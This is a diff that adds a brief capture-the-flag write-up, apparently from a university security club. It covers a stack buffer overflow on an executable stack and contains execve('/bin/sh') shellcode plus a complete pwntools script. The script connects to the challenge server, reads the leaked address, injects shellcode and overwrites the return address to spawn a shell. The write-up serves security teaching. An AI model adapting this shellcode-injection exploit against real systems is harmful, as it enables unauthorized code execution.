@@ -1,0 +1,84 @@
+>TODO: add header, date, etc
+
+When overflowing the stack, it's possible to write on new assembly instructions. This is usually prevented by not giving universal execution privilege's, but today's challenge is intentionally an exception. Additionally, we are given the memory address of the program, from which we can extrapolate where to spawn the shell. Combining all this information we can write this x86 64 snippet:
+
+```
+        mov rax, 0x3B
+
+        xor rsi, rsi
+
+        xor rdx, rdx
+
+        mov rdi, {addr_int}
+
+        syscall
+```
+
+Where {addr_int} is the sanitized value we are given for the memory address. We then just need to traverse the script and feed in some dummy values to spawn a shell:
+
+```
+#credit to @struct on discord
+from pwn import *
+
+r = remote('chal.ctf-league.osusec.org', 1332)
+  
+
+# Get the memory addr of where our stuff ends up
+
+message = r.recvuntil(b'\n')
+
+addr = message.split(b' ')[4][:-1]
+
+print(addr)
+
+addr_int = int(addr, 16) + 8 # compensate for aaa
+
+addr_int_asm = addr_int + 8  # add a bit to skip over the "/bin/sh" we enter
+
+
+# Just pick whatever type of seashell
+
+r.recvuntil(b'(1-4): ')
+
+r.sendline(b'2')
+
+
+# Send some shellcode over for our "special instructions" as well as our /bin/sh string
+
+#context.log_level = "debug"
+
+context.terminal = ['tmux', 'splitw', '-h']
+
+context.update(arch="amd64", os="linux")
+
+shellcode = asm(f'''
+
+        mov rax, 0x3B
+
+        xor rsi, rsi
+
+        xor rdx, rdx
+
+        mov rdi, {addr_int}
+
+        syscall
+
+''')
+  
+
+# Send bin sh and then shellcode
+
+# the aaaa is there just for some random reason to get it to work says paul
+
+r.send(b'aaaaaaaa/bin/sh\x00')
+
+r.sendline(shellcode)
+
+# Buffer overflow to set the return address to the address of our assembly
+
+r.recvuntil(b'you!')
+
+r.send(b'A' * 16 + p64(addr_int_asm))
+
+r.interactive()
+```
